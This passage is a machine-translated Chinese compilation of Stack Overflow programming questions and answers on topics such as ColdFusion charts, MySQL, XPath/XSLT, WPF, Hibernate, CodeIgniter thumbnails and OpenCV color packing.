    yaxistitle="% Correct" xaxistitle="Month" 
    sortXAxis="yes"
    xAxistype="Scale"
    showxgridlines="yes"
   scaleFrom="1" 
   scaleTo="110" 
   showLegend="yes"
   tipStyle="mouseOver"
   title="Data Entry Audit %">
   </cfchart> 
```

沿 X 轴将显示月份数字，但它以 2 秒计数，而不是 1、2、3、4、5、6 等。它显示 0、2、4、6、8。有 1 月份的数据，所以是“1”，但 1 没有出现在 x 轴上。我尝试添加 Scalemin=1 和 ScaleMax=12，但似乎 CF 9 不支持此功能。非常感谢任何帮助。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-15T17:14:13.833

你在 x 轴上显示了多少个月？Webcharts3D（底层图表工具）做了很多自动调整，以确保图表元素的最佳拟合。如果 Webcharts3D 正在跳过标签，那么它可能已经决定有太多无法*合理*地沿轴放置。所以它选择显示所有其他标签。

我不认为 cfchart 具有覆盖*x-axis*上的那些特定设置的属性。但是，您可以[使用 webcharts3d 实用程序](http://help.adobe.com/en_US/ColdFusion/9.0/Developing/WSc3ff6d0ea77859461172e0811cbec22c24-74f2.html)来自定义/覆盖默认设置。具体来说，使用`xAxis`“基本”选项卡中的设置（类型、最小/最大比例等）。

# mysql - Mysql where column=id vs where column in (ids)

> ID：11603059
> 
> 赞同：1
> 
> 时间：2012-07-22T18:49:10.073
> 
> 标签：mysql

我想知道为什么我们使用

```
where column=id 
```

对比

```
where column in (id) 
```

我知道第一个只允许一个 id 而第二个将允许多个 id，但是为什么我们不总是使用 in 甚至单列搜索呢？

换句话说，为什么我们不总是使用“（id）中的列”？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-22T18:57:35.483

两者本质上是一样的，所以可以互换。使用哪个是个人喜好。

就个人而言，`=`当我知道我永远不会检查一个以上的值时，我会使用它。`IN`如果有很好的机会稍后我会修改查询以将新值添加到列表中，我会使用它。

当性能不是问题时`IN`，我有时会使用它而不是 ，`REGEXP`因为它更简洁，并且需要更少的输入：

```
WHERE column REGEXP '^(value1|value2)$' 
```

或者

```
WHERE column REGEXP '[[:<:]](value1|value2)[[:>:]]' 
```

当然，鲜为人知的“空安全”相等运算符`<=>`：

```
WHERE column <=> id 
```

没有等效`IN`版本。

# css - Chrome扩展：弹出窗口的默认宽度小于最大宽度？

> ID：11603060
> 
> 赞同：2
> 
> 时间：2012-07-22T18:49:15.020
> 
> 标签：css, google-chrome, google-chrome-extension, popup, popupwindow

我对编程比较陌生，并且正在开发带有弹出窗口的 Chrome 扩展程序。我不知道弹出窗口中的内容，也不知道用户的偏好（显然）。弹出窗口应该能够水平调整大小，但我希望默认（初始）宽度小于最大宽度。

在 popup.html 我有一个`<div id="container">`弹出的元素。

在关联的 CSS 文件中，我有：

```
body{
    -webkit-user-drag: none;
    -webkit-user-select: none;
    overflow: hidden;
    width: 400px;
} 
```

和

```
#container{
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
} 
```

内容填满整个弹出窗口，如果需要，将弹出窗口推到最大尺寸 (800x600)。如有必要，弹出窗口上有一个垂直（高度）滚动条，就像我想要的那样。

我的问题是宽度；加载内容时，弹出窗口将自动更改宽度以适应内容。弹出窗口可能从 400 像素开始，但如果内容为 800 像素或更宽，一旦加载内容，它就会扩大到完整的 800 像素。

由于用户可以调整弹出窗口的宽度，我想指定一些合理的默认宽度，它小于弹出窗口的最大宽度，让用户扩大或缩小弹出窗口，他们应该选择这样做。作为“开箱即用”的行为，将弹出窗口设置为完整的 800px 宽度是不可取的。

我可以`body{max-width: 400px; min-width: 400px;}`用来强制弹出宽度。但是有些用户可能希望弹出窗口更宽，所以我不想这样做。例如，我想将初始宽度设为 400 像素，但仍允许调整弹出窗口的大小。

有没有办法为弹出窗口设置一个*小于*最大弹出宽度的默认宽度，即使内容比这个默认宽度宽，但仍然允许调整（加宽）弹出窗口的大小？

抱歉，如果我遗漏了重要信息，或者这是一个错误的解释。我试图搜索网络并四处玩，但到目前为止它无济于事。我感谢任何教我如何克服这种情况的帮助。

# windows - 使用管理权限在 NSIS 中执行 Execwait

> ID：11603062
> 
> 赞同：7
> 
> 时间：2012-07-22T18:49:39.623
> 
> 标签：windows, installation, nsis

我想以管理员权限[`ExecWait`在 NSIS](http://nsis.sourceforge.net/Docs/Chapter4.html#4.9.1.4)中执行，我无法找到有关此问题的任何文档。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-22T20:55:31.703

一般来说，我会建议整个安装程序应该在这样的情况下[运行提升](https://stackoverflow.com/a/8735349/3501)，它预先让用户清楚地知道需要提升。

如果您不能这样做，那么您应该确保您要运行的程序请求管理员权限。为此，您需要使用[ExecShell](http://nsis.sourceforge.net/Reference/ExecShell)启动程序。

如果该程序不要求管理员权限，您基本上有两种选择：

*   与“runas”动词一起使用`ExecShell`并希望最好（如果用户不是管理员组的成员，则失败，UAC 已关闭或打开 < Vista）
*   编写一个请求管理员权限的小型启动器应用程序，然后启动实际程序。

# javascript - OpenLayers ModifyFeature 不保存新顶点

> ID：11603071
> 
> 赞同：0
> 
> 时间：2012-07-22T18:50:25.007
> 
> 标签：javascript, gis, openlayers

我刚刚开始使用 OpenLayers，并且遇到了一个小问题 - 当我创建 LineString 然后尝试修改它时，我可以移动现有顶点并拖动虚拟顶点来创建新顶点。但是，当我继续添加到该行时，仅保存对现有顶点的更改-丢弃新顶点。我错过了什么吗？你可以看到我在这里谈论的一个例子：

[http://dev.darrenhall.info/temp/open-layers/modify-feature/](http://dev.darrenhall.info/temp/open-layers/modify-feature/)

单击以添加点，并使用点进行编辑，然后单击以继续添加以了解我的意思。任何帮助，将不胜感激！谢谢！

达伦

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-26T13:14:11.593

快速浏览后，您的代码看起来比应有的复杂。

您在单击时手动将点推入点阵列，并使用这些点生成线串。

您不会听到使用虚拟顶点所做的任何更改。我不明白为什么，在您的 addWayPoint 函数中，您没有从图层而不是点数组中获取要素的几何形状。

也许这将是使用真实要素几何并避免使用您的 route.waypoints 的一个好的开始。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T13:24:12.317

最后我决定不使用 modifyFeature，而是使用矢量作为手柄并手动处理拖动和线条修改。你可以在这里看到我的解决方法：

[http://dev.darrenhall.info/temp/open-layers/draw-route](http://dev.darrenhall.info/temp/open-layers/draw-route)

Ordnance Survey 的人为我的代码提供了一个（相当简单的）修复，尽管它在修改后从顶点重新填充了数组：

```
function addWayPoint(e) {    
  var position = osMap.getLonLatFromViewPortPx(e.xy);

  if(route.waypoints.length>1) {
        layers.lines.layer.removeFeatures([layers.lines.feature]);
  }

  /* vvvvvvvvvvv start */
  /* Get the potentially modified feature */

  if (modifyFeature.feature) {
      route.waypoints = [];
      var vertices = modifyFeature.feature.geometry.getVertices();

      for (i = 0; i < vertices.length; i++) {
          //console.log(vertices[i]);
          route.waypoints.push(vertices[i]);
      } 
  }

  /* ^^^^^^^^^^^ end */

  route.waypoints.push(new OpenLayers.Geometry.Point(position.lon, position.lat));

  var string = new OpenLayers.Geometry.LineString(route.waypoints);
  layers.lines.feature = new OpenLayers.Feature.Vector(string, null, styles.pink);
  layers.lines.feature.attributes['id']=1;
  layers.lines.layer.addFeatures([layers.lines.feature]);

  for (i = 0; i < layers.lines.layer.features.length; i++) {
        if (layers.lines.layer.features[i].attributes.id == 1) {
              modifyFeature.selectFeature(layers.lines.layer.features[i]);
        }
  }
} 
```

# c# - 合并列表中的项目c#

> ID：11603074
> 
> 赞同：0
> 
> 时间：2012-07-22T18:51:01.620
> 
> 标签：c#

我现在有两个列表框，lstStock 和 lstSupply。lstSupply 包括

```
-Pen
-Pencil
-Staple
-Stapler
-Folder
-Notebook
-Eraser
-Marker 
```

我有两个按钮，一个名为 btnAdd 的按钮和另一个名为 btnRemove 的按钮。

当我单击 btnAdd 时，我希望将 lstSupply 中的选定项目添加到我已经完成的 lstock 中

```
 lstStock.Item.Add(lstSupply.SelectedItem); 
```

如果我在 lstSupply 中选择了两次相同的项目，我希望将其合并到 lstStock 中。例如，如果我选择 Pen 两次，列表框将给我“Pen x 2”，而不是一行中的 Pen 和另一行中的另一个 Pen。我感觉这是在处理 foreach，但我真的不知道如何使用它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T18:54:39.013

好的，首先，您将需要在其中存储其他内容，`lstStock.` 我建议您这样做：

```
public class StockItem {
    public string Name { get; set; }
    public int Count { get; set; }
} 
```

接下来，我建议您不要将该`.Items`字段用作存储库存项目的实际容器。相反，我会在刷新时`List<StockItem>`使用它来填充。`lstSupply`

```
private List<StockItem> _items = new List<StockItem>(); 
```

然后，当您单击“添加”时，您会做两件事：

1.  遍历`_items`以查看匹配供应中是否已经存在库存项目。创建一个，并添加它，如果它不存在。

2.  在 中找到匹配的库存项目`_items`并增加其`Count`.

为了让它以你想要的方式显示，我们可以`ToString()`在我们的`StockItem`类中重写：

```
public class StockItem {
    public string Name { get; set; }
    public int Count { get; set; }

    public override string ToString() {
        if (Count > 1)
            return Name + " x" + Count;
        return Name;
    } 
} 
```

最后，无论何时进行任何更改，您只需重新填充`lstStock`：

```
private void RefreshGui() {
    lstStock.Items.Clear();
    lstStock.Items.AddRange(_items.ToArray());
} 
```

有很多其他方法可以解决这个问题，但对于这个简单的练习，我认为我会这样做。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T21:12:16.197

如果您希望代码在没有额外编码的情况下工作，您可以简单地执行以下操作：

```
if (lstSupply.SelectedIndex > -1 && !lstStock.Items.Contains(lstSupply.SelectedItem))
        lstStock.Items.Add(lstSupply.SelectedItem); 
```

这样你就可以确定你不会添加空项目，并且每个项目最多添加一次。

# html-agility-pack - 在 XPath 中，我想要一个表达式来选择 div 下的所有节点，但那些不是 a 的节点。树结构必须保持不变

> ID：11603076
> 
> 赞同：1
> 
> 时间：2012-07-22T18:51:20.233
> 
> 标签：html-agility-pack

如何排除节点的特定后代？在这个方向上，表达式 *[not(self::nodetag)] 似乎只是在节点的子级别进行区分，接受返回的节点集中的所有其他后代。我想要一个表达式来选择 div 下的所有节点，但那些不是 a 的节点，请参见下面的示例。树结构必须保持不变。

@Dimitri Novatchev 发布的方法似乎是正确的，但不适用于 HAP 实施：

使用此示例文档：

```
<div>
  <span>
     <a>lala</a>
  </span>
</div> 
```

HAP 将返回以下结构及其建议的表达式 /div/descendant::node()[not(self::a)]

```
<div>
  <span>
     <a>lala</a>
  </span>
</div>
<span>
     <a>lala</a>
 </span> 
```

如果除了嵌套的跨度之外还有另一个标签，它也会将它作为单独的树返回，有人知道这种奇怪的行为吗？它是一个 HAP 错误吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T19:24:00.760

> 我想要一个表达式来选择 div 下的所有节点，但那些不是`a`. 树结构必须保持不变。

**使用**：

```
/div/descendant::node()[not(self::a)] 
```

`div`这将选择（后代）不是的顶部元素的任何后代`a`。

**基于 XSLT 的验证**：

```
<xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>

 <xsl:template match="/">
  <xsl:for-each select="/div/descendant::node()[not(self::a)]">
    <xsl:value-of select="concat('&#xA;', position(), '. &quot;')"/>
    <xsl:copy-of select="."/>"
  </xsl:for-each>
 </xsl:template>
</xsl:stylesheet> 
```

**当此转换应用于提供的 XML 文档时：**

```
<div>
    <span>
        <a>lala</a>
    </span>
</div> 
```

**评估 XPath 表达式，并以适当的格式输出所有选定的节点，以使它们清晰可见**：

```
1\. "
    "

2\. "<span>

   <a>lala</a>

</span>"

3\. "
        "

4\. "lala"

5\. "
    "

6\. "
" 
```

正如我们所见，选择了 6 个节点——一个`span`元素、四个纯空白文本节点和一个非纯空白文本节点——它们都不是`a`.

**更新**：

在评论中，OP 澄清说他实际上希望将 XML 文档转换为另一个，其中`a`a 的任何后代都`div`被省略。

**这是一种这样的转变**：

```
<xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>

 <xsl:template match="node()|@*">
  <xsl:copy>
   <xsl:apply-templates select="node()|@*"/>
  </xsl:copy>
 </xsl:template>

 <xsl:template match="div//a"/>
</xsl:stylesheet> 
```

**当将此转换应用于同一个 XML 文档（上图）时，会产生（我猜是）想要的结果**：

```
<div>
   <span/>
</div> 
```

**如果我们只想产生任何`div`具有后代的`a`后代，那么我们需要几乎相同的转换：**

```
<xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>

 <xsl:template match="node()|@*">
  <xsl:copy>
   <xsl:apply-templates select="node()|@*"/>
  </xsl:copy>
 </xsl:template>

 <xsl:template match="div[.//a]"><xsl:apply-templates/></xsl:template>
 <xsl:template match="div//a"/>
</xsl:stylesheet> 
```

**应用到与上述相同的 XML 文档的结果是：**

```
<span/> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T21:45:54.637

@Devela：您将 XPath 表达式选择的节点集与发出请求的应用程序显示它们的方式混淆了。应用程序通过显示以该节点为根的整个子树来显示该节点是很常见的。因此，如果您的查询是 //div，并且选定的 div 元素之一包含一个`<a>`节点作为后代，则将显示包含该`<a>`元素的结果。您无法通过更改 XPath 表达式来更改它，因为 XPath 表达式没有选择`<a>`元素；您只能通过更改结果的显示方式来更改它。

现在，如果您想显示一个与源中的元素`<div>`类似的元素，只是省略了 ，那么您就超出了 XPath 可以做的范围。XPath 只能选择输入树中节点的子集，它不能创建修改后的树。为此，您需要 XSLT 或 XQuery。`<div>``<a>`

# jquery - 将 JQuery 对象序列化为 JSON - 这应该有效吗？

> ID：11603080
> 
> 赞同：2
> 
> 时间：2012-07-22T18:52:20.933
> 
> 标签：jquery, json, serialization

这应该很简单，但是在调试油脂猴子脚本时我无法弄清楚。可以将 JQuery 对象（例如单个元素）转换为 JSON 吗？例如`JSON.stringify($("<p />"))`，我得到了一个周期性参考错误。

我一直在这里试验：http: [//jsfiddle.net/q7ywV/2/](http://jsfiddle.net/q7ywV/2/)

html

```
<p> whatever </p>
<p> whatever2 </p> 
```

js

```
try {
  zoom = JSON.stringify($("p").eq(0));
  console.log(zoom);
}
catch (e) {
    console.log(e);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T19:06:46.770

您不能将 dom 和期望作为 json 传递。您可以将其存储为数组转换为 JSOn，然后使用 JSON.stringify

另外，您获取字符串的方法是错误的。下面应该只适用于字符串。您可以将一个或多个 html 元素存储为数组，然后使用 stringify。 [http://jsfiddle.net/q7ywV/13/](http://jsfiddle.net/q7ywV/13/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T18:59:01.417

显然，JSON 并不是为了表示复杂的对象而设计的，比如 DOM 元素。仅限简单对象。

# c# - 在 ComboBox 的选定项中显示图像

> ID：11603081
> 
> 赞同：2
> 
> 时间：2012-07-22T18:52:22.060
> 
> 标签：c#, wpf, xaml, combobox, datatemplate

我的 WPF 窗口 ComboBoxes 有一个自定义模板，它显示从 ComboBoxItem 继承的项目，这些项目也有一个 Image 属性（以便我的项目可以显示文本和图像）。对于任何给定项目，组合框的弹出菜单中的文本和图像都按预期显示，但我无法在当前选定的项目中显示图像。

ComboBox 模板中显示当前选定项的 ContentPresenter 将其 Content 属性正确绑定到 {TemplateBinding SelectionBoxItem}，并且其 ContentTemplate 绑定到以下静态资源：

```
 <DataTemplate x:Key="SelectionBoxItemTemplateTextAndImage" DataType="{x:Type SB:SBComboBoxItem}">
        <Grid>
            <Grid.ColumnDefinitions>
                <ColumnDefinition Width="20"/>
                <ColumnDefinition/>
            </Grid.ColumnDefinitions>
            <Image Source="{Binding Image}"/>
            <TextBlock Grid.Column="1" Text="{Binding}"/>
        </Grid>
    </DataTemplate> 
```

SBComboBoxItem 是从 ComboBox 继承的自定义控件，并且包含正确注册为 DependencyProperty 的“图像”属性。

我尝试了该 DataTemplate 的替代实现，包括使用：

```
{Binding Path=Image, RelativeSource={RelativeSource TemplatedParent}} 
```

作为图像的来源。这不起作用，即使当我将 TextBlock 的 Text 属性设置为：

```
{Binding Path=Content, RelativeSource={RelativeSource TemplatedParent}} 
```

我已经玩过，发现了许多显示文本的实现，但等价物对图像不起作用。我不明白为什么这不起作用，因为设置弹出窗口以显示图像和文本是轻而易举的事。

编辑：这是 ComboBoxItem 处理图像的附加功能，以防我在那里做错了什么：

```
 public static readonly DependencyProperty ImageProperty = DependencyProperty.Register("Image", typeof(Image), typeof(SBComboBoxItem));
    public Image Image { get { return (Image)GetValue(ImageProperty); } set { SetValue(ImageProperty, value); } } 
```

这里是我有一个 ComboBox 并添加了项目的地方：

```
<ComboBox SelectedIndex="1">
    <SB:SBComboBoxItem Content="Text">
        <SB:SBComboBoxItem.Image>
            <Image Source="..\Images\Table.png"/>
        </SB:SBComboBoxItem.Image>
    </SB:SBComboBoxItem>
    <SB:SBComboBoxItem Content="MoreText">
        <SB:SBComboBoxItem.Image>
            <Image Source="..\Images\Euclidian.png"/>
        </SB:SBComboBoxItem.Image>
    </SB:SBComboBoxItem>
</ComboBox> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-23T03:09:33.967

尽管我使用 DataTemplate 通过 DataTemplate 的 DataType 属性公开我选择的组合框项的基础类型，但我的 ComboBox 的 SelectionBoxItem 属性显然返回了一些无法转换为我的自定义 ComboBoxItem 的内容。我不知道为什么会这样，也不知道为什么它没有触发任何运行时错误，但我发现通过绑定到 ComboBox 的 SelectedItem 属性而不是 ContentPresenter 中的 SelectionBoxItem 允许我访问用户定义的属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T19:00:14.180

DataTemplate 甚至可以工作吗？据我所知，任何可以呈现的 WPF 元素都不会使用 DataTemplate。并且您的自定义 ComboBoxItem 可以在没有 DataTemplate 的情况下呈现。

所以第一个问题是，是否应用了 DataTemplate？（只需更改 DataTemplates 网格的背景并找出它，如果它有效）。

让我们假设 DataTemplate 确实有效，我会尝试：

{绑定路径=Image,RelativeSource={RelativeSource AncestorType={x:Type SB:SBComboBoxItem}}

或作为带有 Content.Image 的 TemplatedParent 的 RelativeSource

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-22T20:17:34.967

好的，在 DataTemplate 部分，您必须绑定 Image 的 Source 属性，而不是 Image 本身。

像这样：

```
<Window x:Class="WpfApplication2.MainWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="MainWindow" Height="350" Width="525">
<Window.Resources>
    <BitmapImage x:Key="validImg" UriSource="test.png" />

    <DataTemplate  x:Key="TEMP" DataType="ComboBoxItem">
        <StackPanel Orientation="Horizontal">

            <!--Not working Content(Image) is not valid for Source property I think-->
            <Image Source="{Binding Path=Content}" />
            <!--Working -->
            <Image Source="{Binding Path=Content.Source}" />
            <TextBlock Text="{Binding Path=Content}" />
        </StackPanel>
    </DataTemplate>
</Window.Resources>

<Grid>
    <ContentPresenter 
        Content="{Binding Items[0], ElementName=test}"
        ContentTemplate="{StaticResource TEMP}">
    </ContentPresenter>

    <ComboBox x:Name="test" Height="50" Margin="0, 50, 0, 0">
        <ComboBoxItem >
            <ComboBoxItem.Content>
                <Image Source="{StaticResource validImg}" />
            </ComboBoxItem.Content>
        </ComboBoxItem>
    </ComboBox>
</Grid> 
```

# hibernate - 休眠一对多映射外键问题

> ID：11603085
> 
> 赞同：1
> 
> 时间：2012-07-22T18:52:59.997
> 
> 标签：hibernate, hibernate-mapping

我是新来的冬眠。请帮助我理解这一点。

我有 Department 和 Employee 对象。部门有级联类型 SAVE 的员工集合。我已经创建了部门对象和员工对象。让我们分别说 dept1 和 emp1。当我保存 dept1 对象（具有 emp1）时，它将 dept1 和 emp1 保存在部门和员工表中出外键。

除非我在 emp1 上设置 department(dept1) ，否则它不会保存外键。为什么我要手动设置？不能冬眠吗？这样做有什么理由吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-22T22:04:20.517

因为这就是 Hibernate 文档和 JPA 规范告诉您这样做的方式。在双向关联中，有所有者方和反方。所有者方是没有`mappedBy`属性的一方。反面是具有`mappedBy`属性的一面。

在双向 OneToMany 中，所有者方始终是多方（拥有外键的一方）。

Hibernate/JPA 只关心所有者方面。如果不初始化所有者端，则认为关联不存在。除非您真的知道自己在做什么，否则一个好的经验法则是初始化关联的双方，以使您的实体图连贯。

# codeigniter - 在 CodeIgniter 中一次显示多个缩略图

> ID：11603088
> 
> 赞同：2
> 
> 时间：2012-07-22T18:53:02.790
> 
> 标签：codeigniter, thumbnails

目前我正在学习和尝试 CodeIgniter 能够做到的事情。但我坚持同时制作多个缩略图。可能，我使用 Wordpress 搞砸了我的脑袋，并试图在 Codeigniter 中做这样的事情，但无论如何，这是我的代码

```
<?php

class Gallery_model extends CI_Model {

var $gallery_path;

function __construct() {
    parent::__construct();
    $this->load->helper('functions');
    $this->gallery_path = realpath(APPPATH . '../uploads');
}

function do_upload() {

    $config = array(
        'allowed_types' => 'jpg|jpeg|gif|png',
        'upload_path' => $this->gallery_path,
        'max_size' => 2000
    );

    $this->load->library('upload', $config);
    $this->upload->do_upload();
    $image_data = $this->upload->data();

    $image_sizes = array(
        'thumb' => array(150, 100),
        'medium' => array(300, 300),
        'large' => array(800, 600)
    );

    foreach ($image_sizes as $resize) {

        $config = array(
            'source_image' => $image_data['full_path'],
            'new_image' => $this->gallery_path . '-' . $resize[0] . 'x' . $resize[1],
            'maintain_ration' => true,
            'width' => $resize[0],
            'height' => $resize[1]
        );

        $this->load->library('image_lib', $config);
        $this->image_lib->resize();
    }
}
} 
```

目前，我只能自己创建一个图像，但我不能用它制作缩略图。也许有人可以增强代码，并让它工作:)

PS - 我尝试在 $image_sizes 之后获取所有内容，将其放入其他独立的 php 文件中，运行它，然后 var 将 $config 转储到 foreach 中，它似乎可以正常工作。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-07-22T19:11:41.087

像这样使用它：

```
$this->load->library('image_lib');
foreach ($image_sizes as $resize) {

    $config = array(
        'source_image' => $image_data['full_path'],
        'new_image' => $this->gallery_path . '-' . $resize[0] . 'x' . $resize[1],
        'maintain_ration' => true,
        'width' => $resize[0],
        'height' => $resize[1]
    );

    $this->image_lib->initialize($config);
    $this->image_lib->resize();
    $this->image_lib->clear();
} 
```

`initialize`比使用`$config`.

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2019-03-05T14:13:51.627

我解决了。

我创建这个函数来创建多个缩略图：

```
function _create_thumbs($file_name){
    // Image resizing config
    $config = array(
        // Large Image
        array(
            'image_library' => 'GD2',
            'source_image'  => './assets/images/'.$file_name,
            'maintain_ratio'=> FALSE,
            'width'         => 700,
            'height'        => 467,
            'new_image'     => './assets/images/large/'.$file_name
            ),
        // Medium Image
        array(
            'image_library' => 'GD2',
            'source_image'  => './assets/images/'.$file_name,
            'maintain_ratio'=> FALSE,
            'width'         => 600,
            'height'        => 400,
            'new_image'     => './assets/images/medium/'.$file_name
            ),
        // Small Image
        array(
            'image_library' => 'GD2',
            'source_image'  => './assets/images/'.$file_name,
            'maintain_ratio'=> FALSE,
            'width'         => 100,
            'height'        => 67,
            'new_image'     => './assets/images/small/'.$file_name
        ));

    $this->load->library('image_lib', $config[0]);
    foreach ($config as $item){
        $this->image_lib->initialize($item);
        if(!$this->image_lib->resize()){
            return false;
        }
        $this->image_lib->clear();
    }
} 
```

然后，当我像这样上传图像时调用该函数：

```
function do_upload(){
  $config['upload_path'] = './assets/images/'; //path folder
    $config['allowed_types'] = 'gif|jpg|png|jpeg|bmp';
    $config['encrypt_name'] = TRUE;

    $this->upload->initialize($config);

  if(!empty($_FILES['filefoto']['name'])){
        if ($this->upload->do_upload('filefoto')){
        $img = $this->upload->data();
          //Compress Image
            $this->_create_thumbs($img['file_name']);

            $title = $this->input->post('title',TRUE);
            $image_large = $img['file_name'];
            $image_medium = $img['file_name'];
            $image_small = $img['file_name'];

            $this->upload_model->insert_images($title,$image_large,$image_medium,$image_small);
                }else{
                echo $this->upload->display_errors();
              }

        }else{
                echo "image is empty or type of image not allowed";
        } 
```

}

# javascript - 空白函数产生“预期对象”错误

> ID：11603089
> 
> 赞同：1
> 
> 时间：2012-07-22T18:53:42.417
> 
> 标签：javascript, function, object

我的 HTML 中有以下标记：

```
 <script type="text/javascript" src="scripts/formProperties.js"></script>
</head>
<body onLoad="alert('1'); setUrlParams(); extractQS('myForm')"> 
```

这将调出一个 Javascript 外部脚本 formProperties.js，它现在只有这个：

```
function setUrlParams() {
    alert("A");
}

function extractQS(id) {
    alert("B");
} 
```

但是，在运行 HTML 时，出现以下错误：

> `"Object expected: line 1 Char 0"`

当我确定包含具有它的外部脚本时，我对几乎空白的函数如何产生这样的错误感到困惑。

我正在使用 IE8。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T23:12:39.823

如果 IE 找不到*setUrlParams*或*extractQS*中的任何一个，您将收到该错误。检查脚本文件的路径是否正确。

# c++ - OpenInventor 到 PCD：无法将 RGB 转换为十进制

> ID：11603091
> 
> 赞同：2
> 
> 时间：2012-07-22T18:53:57.177
> 
> 标签：c++, opencv, rgb, point-cloud-library, openinventor

我正在编写一个小程序来将 OpenInventor 文件转换为 PCD 文件。为此，我输入了两个文件，即 OpenInventor 文件和 JPEG 图像。纹理坐标是介于 0.0 和 1.0 之间的浮点值。

我使用 OpenCV 提取 RGB 值并以十进制格式返回，但是下面的函数似乎无法正常工作...

```
float get_color(cv::Mat img, float x, float y) {

    int i = x*img.cols;
    int j = y*img.rows;

    unsigned char R = img.ptr<unsigned char>(j)[3*i];
    unsigned char G = img.ptr<unsigned char>(j)[3*i+1];
    unsigned char B = img.ptr<unsigned char>(j)[3*i+2];

    return  R*pow(16,4) +
            G*pow(16,2) +
            B;
} 
```

我加载图像

```
 cv::imread("filename.jpg", CV_LOAD_IMAGE_COLOR). 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T19:09:21.640

您的意思是将其作为 32 位整数返回吗？

```
unsigned int get_color(cv::Mat img, float x, float y) 
{

    int i = x*img.cols;
    int j = y*img.rows;

    unsigned char R = img.ptr<unsigned char>(j)[3*i];
    unsigned char G = img.ptr<unsigned char>(j)[3*i+1];
    unsigned char B = img.ptr<unsigned char>(j)[3*i+2];

    return  (R << 16) |
            (G << 8) |
            B;
} 
```

或者您可能希望将其作为浮点数返回，在这种情况下您需要执行以下操作

```
struct FloatColour
{
    float r;
    float g;
    float b;
};

float get_color(cv::Mat img, float x, float y) 
{

    int i = x*img.cols;
    int j = y*img.rows;

    unsigned char R = img.ptr<unsigned char>(j)[3*i];
    unsigned char G = img.ptr<unsigned char>(j)[3*i+1];
    unsigned char B = img.ptr<unsigned char>(j)[3*i+2];

    FloatColour retCol;
    retCol.r = R / 255.0f;
    retCol.g = G / 255.0f;
    retCol.b = B / 255.0f;
    return retCol;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-23T12:53:37.283

我在 PCL 标题“point_types.hpp”（PCL 版本：1.5.1）中的评论中找到了我自己问题的答案：

> 由于历史原因（PCL 最初是作为 ROS 包开发的），RGB 信息被打包成整数并转换为浮点数。这是我们希望在不久的将来删除的内容，但与此同时，以下代码片段应该可以帮助您在 PointXYZRGB 结构中打包和解包 RGB 颜色：
> 
> ```
> uint8_t r = 255, g = 0, b = 0;
> uint32_t rgb = ((uint32_t)r << 16 | (uint32_t)g << 8 | (uint32_t)b);
> p.rgb = *reinterpret_cast<float*>(&rgb); 
> ```

经过重构和其他一些错误修复后，功能变为：

```
float get_color(cv::Mat img, float s, float t){

        int j = (1.0 - s)*(float)img.cols;
        int i = (1.0 - t)*(float)img.rows;

        uint8_t R = img.at<cv::Vec3b>(i,j)[2];
        uint8_t G = img.at<cv::Vec3b>(i,j)[1];
        uint8_t B = img.at<cv::Vec3b>(i,j)[0];

        uint32_t rgb_32 = ((uint32_t)R << 16 | (uint32_t)G << 8 | (uint32_t)B);

        return *reinterpret_cast<float*>(&rgb_32);
} 
```

# android - 膨胀到列表中的许多视图

> ID：11603092
> 
> 赞同：1
> 
> 时间：2012-07-22T18:54:11.137
> 
> 标签：android, listview, reference, inflate

我有一个 listView 并希望在您按下它时展开每个项目。我有以下代码可以做到这一点。我通过给 ViewStub 充气来工作。

它工作正常。也就是说，当我按下一个列表项时，它确实会膨胀。到目前为止，一切都很好。

但是，我的列表很长，我注意到当我向下滚动列表时，其他项目也膨胀了。我不完全确定为什么。当我再次向上滚动时，我最初按下的项目已经“放气”，而其他一些项目却变得膨胀了。

```
@override
public void onListItemClick(ListView l, View v, int position, long id) {

    ListView list = getListView();
    int start = list.getFirstVisiblePosition();
    for (int i = start, j = list.getLastVisiblePosition(); i <= j; i++) {
        Cursor item = (Cursor) list.getItemAtPosition(i);

        if (id == item.getLong(item.getColumnIndex(ItemColumns._ID))) {
            View view = list.getChildAt(i - start);

            ViewStub stub = (ViewStub) view.findViewById(R.id.stub);
            if (stub != null) {
                stub.inflate();

            }       
        }
    }
} 
```

任何帮助都感激不尽！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T19:01:09.610

Android 在`ListView`. 这就是为什么`convertView`在`getView(..)`您的`Adapter`. 这篇 SO 帖子将解释：[ListView reusing views when ... I don't want it to](https://stackoverflow.com/questions/6921462/listview-reusing-views-when-i-dont-want-it-to) 基本上你需要做的是持有一个`Set`当前扩展的项目，并在你的`getView(..)`方法中进行查找：

